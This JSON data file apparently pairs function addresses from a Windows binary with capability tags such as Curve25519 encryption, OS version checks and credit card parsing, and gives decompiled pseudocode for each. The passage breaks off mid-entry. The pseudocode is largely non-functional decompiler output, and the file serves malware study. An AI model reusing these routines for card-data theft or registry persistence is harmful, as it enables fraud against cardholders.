{
    "004010b0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004010b0(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "004031a0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004031a0(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iVar2;\n    uint16_t unaff_BX;\n    uint *puVar3;\n    uint *puVar4;\n    uchar *puVar5;\n    bool bVar6;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    puVar3 = &stack0xfffffffc;\n    iVar2 = fcn.004022f0(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar2 != 0) {\n        bVar6 = (((unaff_BX ^ arg_ch_00) >> 8) - 1U & 0xd) != 0;\n        *(iVar2 + 0x58) = arg_ch;\n        puVar5 = &stack0xfffffffc;\n        if ((bVar6) && (puVar5 = &stack0xfffffffc,  !bVar6)) {\n            puVar4 = &stack0xffffffec;\n            puVar5 = &stack0xffffffec;\n            cVar1 = '\\x10';\n            do {\n                puVar3 = puVar3 + -1;\n                puVar4 = puVar4 + -1;\n                *puVar4 = *puVar3;\n                cVar1 = cVar1 + -1;\n            } while ('\\0' < cVar1);\n        }\n        fcn.004022f0(arg_8h_00, arg_ch_00, puVar5 + 8, puVar5 + 0xc);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 386
    },
    "00404460": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404a4e) overlaps instruction at (ram,0x00404a4c)\n// \n// WARNING: Removing unreachable block (ram,0x00404485)\n// WARNING: Removing unreachable block (ram,0x0040448a)\n\nint32_t fcn.00404460(void)\n\n{\n    uint8_t *puVar1;\n    int32_t *piVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    int16_t iVar5;\n    uint16_t uVar6;\n    uint in_EAX;\n    int32_t iVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    uint8_t extraout_CL;\n    ushort extraout_CX;\n    char extraout_CH_00;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint8_t extraout_CH;\n    int32_t extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    uint8_t extraout_DL;\n    ushort extraout_DX;\n    int16_t extraout_DX_00;\n    int32_t extraout_EDX;\n    uint8_t uVar11;\n    uint32_t unaff_EBX;\n    uint8_t *puVar10;\n    uint16_t uVar12;\n    int16_t iVar13;\n    uint *puVar14;\n    uint *unaff_ESI;\n    uint *puVar15;\n    uint *puVar16;\n    uint *unaff_EDI;\n    uint *puVar17;\n    uint *puVar18;\n    ushort in_ES;\n    ushort in_SS;\n    ushort in_DS;\n    uchar uVar19;\n    uint8_t in_AF;\n    bool bVar20;\n    uchar uVar21;\n    char cVar22;\n    bool bVar23;\n    char in_SF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char in_OF;\n    char cVar24;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar25;\n    ulong uVar26;\n    uint64_t uVar27;\n    uint in_stack_ffffffa5;\n    uint in_stack_ffffffa9;\n    uint in_stack_ffffffad;\n    unkbyte3 Var28;\n    uint uVar29;\n    uint arg_10h;\n    ushort in_stack_ffffffc1;\n    ushort uVar30;\n    uchar uVar31;\n    uchar uVar32;\n    uchar uVar33;\n    uint16_t uVar34;\n    \n    puVar18 = unaff_EDI;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        out(0xc4, in_EAX);\n        puVar18 = unaff_EDI + 1;\n        *unaff_EDI = in_EAX;\n    }\n    fcn.00401000(0x411550, 0xd, 0x407024, 10);\n    uVar6 = unaff_EBX;\n    uVar9 = (unaff_EBX >> 8 & 0xffff00) << 8;\n    fcn.00401000(0x411550, 0xd, 0x407030, 0x12);\n    uVar11 = ((uVar6 ^ unaff_ESI) >> 8) - 1;\n    bVar20 = (uVar11 & 0xd) == 0;\n    uVar19 = (POPCOUNT(uVar11 & 0xd) & 1U) == 0;\n    uVar4 = CONCAT12(uVar9 >> 0x10, uVar6);\n    fcn.00401000(0x411550, 0xd, 0x407044, 4);\n    if ((!bVar20) && (bVar20)) {\n        uVar19 = (POPCOUNT(&stack0xffffffd9 & 0xff) & 1U) == 0;\n    }\n    uVar30 = 0x4508;\n    uVar25 = fcn.00401000(0x411550, 0xd, 0x407048, 0xc);\n    pcVar8 = uVar25 >> 0x20;\n    uVar29 = uVar25;\n    if (uVar19) {\ncode_r0x0040451f:\n        uVar30 = 7;\n        uVar21 = 0;\n        uVar31 = 0;\n    }\n    else {\n        uVar21 = SUB41(unaff_ESI, 0);\n        uVar31 = unaff_ESI >> 8;\n        if (!uVar19) goto code_r0x0040451f;\n        out(*unaff_ESI, uVar25 >> 0x20);\n        do {\n            cVar22 = uVar29 >> 8;\n            in_AF = 9 < (uVar29 & 0xf) | in_AF;\n            uVar29 = CONCAT31(CONCAT21(uVar29 >> 0x10, cVar22 - in_AF), -in_AF);\n        } while (in_AF || cVar22 == *pcVar8);\n        piVar2 = puVar18 + pcVar8 * 2;\n        *piVar2 = (*piVar2 + 0x7b) - in_AF;\n        *(extraout_ECX + 0x6a) = uVar29;\n        unaff_ESI = unaff_ESI + 1;\n        in_ES = in_stack_ffffffc1;\n    }\n    fcn.00401000(0x411550, 0xd, 0x407054, CONCAT13(uVar31, CONCAT12(uVar21, uVar30)));\n    bVar20 = false;\n    uVar12 = uVar6 & 0xff | (uVar4 >> 8) << 8;\n    uVar9 = uVar9 & 0xff000000 | uVar4 & 0xffff0000;\n    uVar11 = fcn.00401000(0x411550, 0xd, 0x40705c, 0xb);\n    if (!bVar20) {\n        puVar18 = puVar18 & 0xffff0000 | puVar18 & 0xff | (puVar18 >> 8) << 8;\n    }\n    puVar17 = puVar18 + 1;\n    cVar22 = uVar11 - *puVar18;\n    uVar34 = (in_NT & 1) * 0x4000 | SBORROW1(uVar11, *puVar18) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (cVar22 < '\\0') * 0x80 | (cVar22 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar22) & 1U) == 0) * 4\n             | uVar11 < *puVar18;\n    uVar11 = (in_ID & 1) * 0x200000 >> 0x10 | (in_VIP & 1) * 0x100000 >> 0x10 | (in_VIF & 1) * 0x80000 >> 0x10 |\n             (in_AC & 1) * 0x40000 >> 0x10;\n    uVar19 = 0;\n    puVar15 = unaff_ESI + -1;\n    puVar16 = &stack0xffffffd1;\n    uVar25 = func_0x1018a4e5();\n    bVar20 = (*(uVar25 + -0x7f + (uVar9 | uVar12)) & 0x4b) == 0;\n    puVar14 = (uVar25 >> 0x20) + 0xc;\n    fcn.00401000(0x411550, 0xd, 0x407068, CONCAT13(uVar19, CONCAT12(uVar11, uVar34)));\n    if ((!bVar20) && (bVar20)) {\n        out(*puVar15, extraout_DX);\n        puVar15 = unaff_ESI;\n    }\n    fcn.00401000(0x411550, 0xd, 0x407074, 8);\n    fcn.00401000(0x411550, 0xd, 0x40707c, 0xd);\n    fcn.00401000(0x411550, 0xd, 0x40708c, 0x18);\n    fcn.00401000(0x411550, 0xd, 0x4070a4, 0x25);\n    uVar34 = fcn.00401000(0x411550, 0xd, 0x4070cc, 10);\n    uVar19 = 0;\n    uVar21 = (uVar34 & 0x11cb) == 0;\n    bVar20 = (POPCOUNT(uVar34 & 0xcb) & 1U) == 0;\n    fcn.00401000(0x411550, 0xd, 0x4070d8, 0xc);\n    if ((!bVar20) && (bVar20)) {\n        cVar22 = '\\x1e';\n        do {\n            puVar14 = puVar14 + -1;\n            puVar16 = puVar16 + -1;\n            *puVar16 = *puVar14;\n            cVar22 = cVar22 + -1;\n        } while ('\\0' < cVar22);\n        iVar7 = in(0x78);\n        return iVar7;\n    }\n    uVar31 = 0x40;\n    uVar32 = 0;\n    fcn.00401000(0x411550, 0xd, 0x4070e4, 0xd);\n    if ((uVar19 || uVar21) || (!uVar19 && !uVar21)) {\n        in_ES = 6;\n        uVar31 = 0;\n        uVar32 = 0;\n    }\n    else {\n        *puVar17 = *puVar15;\n        uVar12 = CONCAT11(0xdf, uVar6 & 0xff);\n        puVar14 = 0x6ae181d0;\n        puVar15 = puVar15 + 1;\n        puVar17 = puVar18 + 5;\n    }\n    puVar10 = uVar9 | uVar12;\n    arg_10h = 0x4070f4;\n    uVar29 = 0xd;\n    fcn.00401000(0x411550, 0xd, 0x4070f4, CONCAT13(uVar32, CONCAT12(uVar31, in_ES)));\n    uVar19 = 0;\n    fcn.00401000(0x411550, 0xd, 0x4070fc, 5);\n    iVar5 = 0xd;\n    uVar21 = 0;\n    uVar31 = 0;\n    uVar25 = fcn.00401000(0x411550, 0xd, 0x407104, 0xd);\n    iVar7 = uVar25 >> 0x20;\n    uVar11 = extraout_ECX_00 >> 8;\n    if (uVar19) {\ncode_r0x0040474f:\n        uVar30 = 0x19;\n        uVar32 = 0;\n        uVar33 = 0;\n        arg_10h = 0x407114;\n        uVar29 = 0xd;\n        puVar18 = puVar17;\ncode_r0x00404755:\n        *(iVar7 + 0xd) = *(iVar7 + 0xd) + uVar11;\n        fcn.00401000(0x411550, uVar29, arg_10h, CONCAT13(uVar33, CONCAT12(uVar32, uVar30)));\n        iVar5 = puVar18;\n        bVar20 = iVar5 == 0;\n        uVar26 = fcn.00401000(0x411550, 0xd, 0x407130, 0xf);\n        iVar7 = uVar26 >> 0x20;\n        uVar11 = extraout_CH;\n        if (!bVar20) {\n            uVar21 = puVar18 >> 0x10;\n            uVar31 = puVar18 >> 0x18;\n            puVar16 = puVar15;\n            if (bVar20) goto code_r0x004047ab;\n        }\n        iVar5 = 0xe;\n        uVar21 = 0;\n        uVar31 = 0;\ncode_r0x004047af:\n        *(iVar7 + 0xe) = *(iVar7 + 0xe) ^ uVar11;\n        fcn.00401000(0x411550, 0xd, 0x407140, CONCAT13(uVar31, CONCAT12(uVar21, iVar5)));\n        fcn.00401000(0x411550, 0xd, 0x407150, 0xb);\n        uVar19 = extraout_CL < extraout_DL;\n        cVar22 = extraout_CL == 1;\n        fcn.00401000(0x411550, 0xd, 0x40715c, 0xb);\n        puVar14 = puVar18;\n        puVar16 = puVar15;\n    }\n    else {\n        uVar30 = extraout_ECX_00;\n        uVar32 = extraout_ECX_00 >> 0x10;\n        uVar33 = extraout_ECX_00 >> 0x18;\n        if (!uVar19) goto code_r0x0040474f;\n        pcVar8 = uVar25 + 1;\n        puVar16 = puVar15 + 1;\n        *puVar17 = *puVar15;\n        iVar7 = 0x1468196a;\n        uVar26 = CONCAT44(0x1468196a, pcVar8);\n        puVar15 = puVar16;\n        puVar18 = puVar17 + 1;\n        if (SCARRY4(uVar25, 1)) goto code_r0x00404755;\n        uVar12 = *0x10 - 0x3f;\n        puVar3 = segment(in_SS, uVar12);\n        *puVar3 = puVar14 & 0xffff;\n        iVar13 = puVar14;\n        cVar22 = '\\x0e';\n        uVar6 = uVar12;\n        do {\n            iVar13 = iVar13 + -4;\n            puVar18 = segment(in_DS, iVar13);\n            uVar6 = uVar6 - 4;\n            puVar14 = segment(in_SS, uVar6);\n            *puVar14 = *puVar18;\n            cVar22 = cVar22 + -1;\n        } while ('\\0' < cVar22);\n        puVar3 = segment(in_SS, *0x10 + -0x7b);\n        *puVar3 = uVar12;\n        *pcVar8 = *pcVar8 + pcVar8;\n        *(puVar17 + 0x6a) = *(puVar17 + 0x6a) + 'j';\n        puVar18 = 0xf5f9ce2;\n        *pcVar8 = *pcVar8 + pcVar8;\ncode_r0x004047ab:\n        iVar7 = uVar26 >> 0x20;\n        puVar14 = puVar18 + 1;\n        uVar29 = in(uVar26 >> 0x20);\n        *puVar18 = uVar29;\n        puVar15 = puVar16;\n        puVar18 = puVar14;\n        if (0 < &stack0xffffffd2) goto code_r0x004047af;\n        puVar1 = puVar16 + -0x79127501;\n        uVar19 = CARRY1(*puVar1, uVar26);\n        *puVar1 = *puVar1 + uVar26;\n        cVar22 = *puVar1 == 0;\n    }\n    do {\n        fcn.00401000(0x411550, 0xd, 0x407168, 0x411550);\n        if ((uVar19) || (!uVar19)) {\n            *(extraout_EDX + 0xd) = *(extraout_EDX + 0xd) + (extraout_ECX_01 >> 8);\n            iVar5 = fcn.00401000(0x411550, in_stack_ffffffa5, in_stack_ffffffa9, in_stack_ffffffad);\n            bVar20 = false;\n            uVar19 = iVar5 + 1 < 0;\n            bVar23 = iVar5 == -1;\n            fcn.00401000(0x411550, 0x4115, 0x407180, 0xc);\n            if ((!bVar20 && !bVar23) && (bVar20 || bVar23)) {\n                uVar19 = &stack0xffffffc4 < 0;\n            }\n            goto code_r0x004048a1;\n        }\n    } while (extraout_ECX_01 != 1 && cVar22 != '\\0');\n    *puVar14 = puVar16 + 1;\n    uVar19 = &stack0xffffffc4 < 0;\ncode_r0x004048a1:\n    uVar21 = 0xb4;\n    Var28 = 0x4048;\n    iVar7 = fcn.00401000(0x411550, 0xd, 0x40718c, 0xe);\n    if ((uVar19) || (!uVar19)) {\n        uVar21 = 0x11;\n        Var28 = 0;\n    }\n    *puVar10 = *puVar10 & 0xc3;\n    iVar5 = fcn.00401000(0x411550, 0xd, 0x40719c, CONCAT31(Var28, uVar21));\n    cVar24 = false;\n    uVar6 = puVar14 & (extraout_DX_00 - iVar5) + 0x1abU;\n    cVar22 = uVar6 < 0;\n    uVar19 = uVar6 == 0;\n    fcn.00401000(0x411550, 0xd, 0x4071b0, 0x13);\n    if ((!cVar24) && (cVar24)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar25 = fcn.00401000(0x411550, 0xd, 0x4071c4, 0x14);\n    if ((!uVar19 && cVar24 == cVar22) && (uVar19 || cVar24 != cVar22)) {\n        puVar10 = uVar25 + 0x6a39da56;\n        *puVar10 = *puVar10 ^ extraout_CX;\n        return uVar25;\n    }\n    pcVar8 = (uVar25 >> 0x20) + 0xd;\n    *pcVar8 = *pcVar8 + (extraout_CX >> 8);\n    fcn.00401000(0x411550, 0xd, 0x4071d8, 0x33);\n    fcn.00401000(0x411550, 0xd, 0x40720c, 10);\n    uVar9 = iVar7 + 0xe40ce22aU & 0xffff0000 | iVar7 + 0xe40ce22aU + 1;\n    bVar20 = uVar9 < 0x222c;\n    bVar23 = uVar9 == 0x222c;\n    uVar9 = fcn.00401000(0x411550, 0xd, 0x407218, 4);\n    if ((!bVar23) && (bVar23)) {\n        puVar10 = puVar10 + 1;\n        if (bVar20 || puVar10 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        in_AF = 9 < (uVar9 & 0xf) | in_AF;\n        piVar2 = (uVar9 & 0xffff0000 | CONCAT11((uVar9 >> 8) + in_AF, uVar9 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar2 = *piVar2 - puVar10;\n    }\n    uVar9 = 0x5004072;\n    uVar21 = 0x1c;\n    Var28 = 0;\n    uVar19 = 0xd;\n    fcn.00401000(0x411550, 0xd, 0x40721c, 5);\n    uVar9 = uVar9 & 0xffffff;\n    fcn.00401000(0x411550, 0xd, 0x407224, 6);\n    uVar6 = puVar14 + 0x2562;\n    cVar24 = '\\0';\n    cVar22 = (uVar6 & 0xffffff00 | uVar6 | 0x4c | extraout_ECX_02) < 0;\n    uVar9 = uVar9 & 0xffffff;\n    uVar27 = fcn.00401000(0x411550, 0xd, 0x407258, 0x2a);\n    iVar7 = uVar27 >> 0x20;\n    if (cVar24 == cVar22) {\n        uVar9 = uVar9 & 0xffffff | puVar10 << 0x18;\n        uVar30 = puVar10 >> 8;\n        uVar31 = puVar10 >> 0x18;\n        if (cVar24 != cVar22) {\n            iVar7 = uVar27;\n            if (uVar27 < 0x84680b6a00000000) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            goto code_r0x00404a54;\n        }\n    }\n    uVar30 = 0;\n    uVar31 = 0;\n    uVar9 = 0xb004072;\n    uVar19 = 0xd;\n    uVar21 = 0x84;\n    Var28 = 0;\ncode_r0x00404a54:\n    *(iVar7 + 0xd) = *(iVar7 + 0xd) + extraout_CH_00;\n    iVar7 = fcn.00401000(0x411550, CONCAT31(Var28, uVar19), CONCAT31(uVar9, uVar21), \n                         CONCAT13(uVar31, CONCAT21(uVar30, uVar9 >> 0x18)));\n    return iVar7;\n}\n",
        "token_count": 5102
    },
    "00401430": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nulong fcn.00401430(void)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    uint var_94h;\n    uint32_t var_90h;\n    int32_t var_8ch;\n    \n    puVar2 = &var_94h;\n    while( true ) {\n        var_94h = 0x94;\n        puVar1 = (*_sym.imp.KERNEL32.dll_GetVersionExA)(puVar2);\n        if (var_90h == 5) {\n            return 1;\n        }\n        if (var_90h < 5) break;\n        if (var_90h >= 5) break;\n        puVar2 = puVar1 + 1;\n        if (&stack0xffffff60 < *puVar1 || puVar2 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 248
    },
    "004018e0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401978) overlaps instruction at (ram,0x00401976)\n// \n\nbool __cdecl fcn.004018e0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint16_t extraout_CX;\n    uint8_t extraout_DH;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(arg_8h);\n    var_14h = 0x407440;\n    var_10h = 0x407438;\n    var_ch = 0x407448;\n    var_8h = 0x407450;\n    var_4h = 0x407458;\n    puVar2 = &var_14h;\n    uVar5 = 0;\n    do {\n        uVar4 = *puVar2;\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, uVar4);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar3 = uVar5 + 1;\n        puVar2 = puVar2 + 1;\n        iVar1 = uVar5 - 4;\n        uVar5 = uVar3;\n    } while (uVar3 < 5);\n    if ((uVar3 < 5) || (uVar5 = uVar4 & 0xffff | extraout_CX << 0x10,  SBORROW4(uVar3, 5) == iVar1 < 0)) {\n        uVar5 = 0x407430;\n    }\n    else {\n        *(puVar2 * 3) = *(puVar2 * 3) ^ extraout_DH;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, uVar5);\n    return iVar1 == 0;\n}\n",
        "token_count": 474
    },
    "00402ab0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402b22)\n\nbool fcn.00402ab0(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.004034c0(0x80000002, 0x4072f0, 0x407330, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 168
    },
    "00403ca0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403ca0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x40708c, arg_8h);\n    (*pcVar2)(&var_264h, 0x4070a4, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_44h = ~uVar4 - 1;\n    var_34h = 0x4070cc;\n    var_30h = 0x4070d8;\n    var_2ch = 0x4070e4;\n    var_28h = 0x4070f4;\n    var_24h = 0x4070fc;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((var_44h != 0) && (var_44h == 0)) {\n        out(*arg_8h, 4);\n    }\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1131
    },
    "null": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401530": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004016f4) overlaps instruction at (ram,0x004016f0)\n// \n// WARNING: Removing unreachable block (ram,0x00401638)\n// WARNING: Removing unreachable block (ram,0x004015b5)\n// WARNING: Removing unreachable block (ram,0x0040158f)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __fastcall fcn.00401530(uint32_t param_1, int32_t *param_2, uint32_t *param_3)\n\n{\n    uint32_t *puVar1;\n    uint32_t **ppuVar2;\n    uint *puVar3;\n    char cVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint16_t uVar7;\n    int32_t *piVar8;\n    uint32_t uVar9;\n    uint8_t unaff_BL;\n    uchar *puVar10;\n    uint32_t **unaff_EDI;\n    ushort in_SS;\n    bool bVar11;\n    bool bVar12;\n    bool bVar13;\n    bool bVar14;\n    bool bVar15;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    \n    puVar10 = &stack0xfffffffc;\n    *param_3 = 0xfa;\n    *(param_3 + 1) = 0x5f;\n    *(param_3 + 2) = 0xa9;\n    *(param_3 + 3) = 0xb;\n    *(param_3 + 1) = 0x13;\n    *(param_3 + 5) = 0xa8;\n    bVar11 = (POPCOUNT((param_3 & 0xae) - 1 & 0xff) & 1U) == 0;\n    *(param_3 + 6) = 0x51;\n    puVar5 = param_3;\n    if ((!bVar11) && (bVar11)) {\n        puVar3 = segment(in_SS, *0x10 + -0x10);\n        param_2 = 0xb7bc9ea5;\n        if (bVar11) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        puVar5 = *puVar3;\n    }\n    *(param_3 + 7) = 0xcc;\n    *(param_3 + 2) = 0xe2;\n    uVar7 = param_1 - 1U & unaff_EDI | 0x61be;\n    *(param_3 + 9) = 0x3b;\n    if ((uVar7 != 0) && (uVar7 == 0)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *(param_3 + 10) = 0xd1;\n    if ((uVar7 < 0) || (uVar7 >= 0)) {\n        *(param_3 + 0xb) = 0xdc;\n    }\n    else {\n        *(puVar5 + -0x1f3a4905) = in_ST0;\n        *param_2 = *param_2 + 0x46c6df84;\n        unaff_BL = unaff_BL | 0xec;\n        in_ST0 = in_ST1;\n        in_ST1 = in_ST2;\n        in_ST2 = in_ST3;\n        in_ST3 = in_ST4;\n        in_ST4 = in_ST5;\n        in_ST5 = in_ST6;\n        in_ST6 = in_ST7;\n    }\n    *(param_3 + 3) = 0x48;\n    do {\n        *(param_3 + 0xd) = 0x87;\n        *(param_3 + 0xe) = 0xb3;\n        piVar8 = param_1 & 0xffff0000 | param_1 & 0xffff & 0xff | ((param_1 & 0xffff) >> 8) - unaff_BL << 8;\n        bVar11 = piVar8 < param_2;\n        bVar15 = SBORROW4(piVar8, param_2);\n        uVar9 = piVar8 - param_2;\n        bVar14 = uVar9 < 0;\n        bVar13 = uVar9 == 0;\n        bVar12 = (POPCOUNT(uVar9 & 0xff) & 1U) == 0;\n        iVar6 = *(puVar10 + 8);\n        *(iVar6 + 0xf) = 0x28;\n        puVar5 = param_3;\n        if ((!bVar14) && (bVar14)) {\n            ppuVar2 = unaff_EDI + 1;\n            puVar1 = param_3 + 1;\n            *(unaff_EDI + 7) = in_ST0;\n            unaff_EDI = unaff_EDI + 5;\n            puVar5 = param_3 + 5;\n            bVar11 = *puVar1 < *ppuVar2;\n            bVar15 = SBORROW1(*puVar1, *ppuVar2);\n            cVar4 = *puVar1 - *ppuVar2;\n            bVar14 = cVar4 < '\\0';\n            bVar13 = cVar4 == '\\0';\n            bVar12 = (POPCOUNT(cVar4) & 1U) == 0;\n            in_ST0 = in_ST1;\n            in_ST1 = in_ST2;\n            in_ST2 = in_ST3;\n            in_ST3 = in_ST4;\n            in_ST4 = in_ST5;\n            in_ST5 = in_ST6;\n            in_ST6 = in_ST7;\n        }\n        *(iVar6 + 0x10) = 0xcd;\n        if ((bVar13 || bVar15 != bVar14) || (!bVar13 && bVar15 == bVar14)) {\n            *(iVar6 + 0x11) = 6;\n        }\n        else {\n            in_ST0 = in_ST0 - *(puVar10 + 0x40c692c9);\n            *puVar5 = *puVar5 + iVar6 + bVar11;\n            bVar12 = (POPCOUNT(*puVar5 & 0xff) & 1U) == 0;\n        }\n        if ((bVar12) || (!bVar12)) goto code_r0x00401717;\n        param_3 = *unaff_EDI;\n        *unaff_EDI = puVar5;\n        puVar10 = puVar10 + -*(puVar10 + 0x5f9dff63);\n    } while (puVar10 < 0);\n    if (-1 < param_3) {\n        fcn.00401530();\n        iVar6 = fcn.004014c0(puVar10 + -0x68, *(puVar10 + -4), 0x407490, 0xa0c0);\n        puVar3 = *(puVar10 + 0xc);\n        **(puVar10 + 8) = 0x407490;\n        *puVar3 = 0xa0c0;\n        return iVar6;\n    }\ncode_r0x00401717:\n    *(iVar6 + 0x12) = 0x53;\n    **(puVar10 + 0xc) = 0x13;\n    return iVar6;\n}\n",
        "token_count": 1698
    },
    "00404df0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
